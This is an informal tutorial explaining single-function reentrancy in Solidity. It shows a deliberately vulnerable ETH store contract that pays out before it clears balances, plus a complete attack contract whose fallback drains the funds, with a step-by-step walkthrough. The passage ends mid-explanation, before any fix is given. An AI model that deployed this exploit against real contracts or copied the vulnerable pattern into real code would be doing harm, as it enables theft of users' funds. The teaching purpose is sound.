## Single-Function Reentrancy

This is a vulnerability where a function within the contract can be called multiple times in quick successions before the first execution of that function completes. This can lead to loss of funds or unexpected behavior within the contract. Lets start by a theoretical example, Imagine a scenario where a function in a smart contract makes an external call to another contract that is not trusted, if the function does't complete its execution before the external contract calls back into the initial contract function and the function is not designed to handle the call properly, it might execute the same function again while the same function is ongoing. Tricky right, enough with the stories lets look at a coding example.

## Example 1

Below is a contract where you can deposit and withdraw ETH, lets see how the contract can be exploited.

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract VulnerableStore {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

   // get the balance
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

```

Good now that our users are able to interact with our contract by withdrawing and depositing lets see how we can get all the money out of the contract.

```solidity

contract Attack {
   VulnerableStore public vulnerableStore;
    uint256 constant public AMOUNT = 1 ether;

    constructor(address _vulnerablestoreAddress) {
        vulnerableStore = VulnerableStore(_vulnerablestoreAddress);
    }

    // Fallback is called when VulnerableStore sends Ether to this contract.
    fallback() external payable {
        if (address(vulnerableStore).balance >= AMOUNT) {
            vulnerableStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= AMOUNT);
        vulnerableStore.deposit{value: AMOUNT}();
        vulnerableStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}


```

**Yyeeeees** we did it but lets now look at what acctually happened. How did we manage to perform the exploit. Our attack contract was able to withdraw all the funds. Below are the steps of how the functions were executed 
1. users are able to deposit using the deposit function. so now lets assume that the contract has funds
2. An attacker deploys the attack function and executes the attack function this function will deposit ETH in our vulnerable store then it will initiate the withdraw function as below

```solidity

function attack() external payable {
    require(msg.value >= AMOUNT) // in our case AMOUNT is some value of ETH say 1 ether
    vulnerableStore.deposit{value: AMOUNT}(); // this is the amount that will be deposited in our VulnerableStore since we can only withdraw if we have some ETH
    vulnerableStore.withdraw();

}

```

**NOTE** If money is sent in our Attack contract the fallback function will be triggered since we received some ether. Why fallback -> when a contract receives ether the fallback and the receive function are triggered, in our case in the fallback function we check that the balance of the vulnerable store is greater than the amount  and call the withdraw again

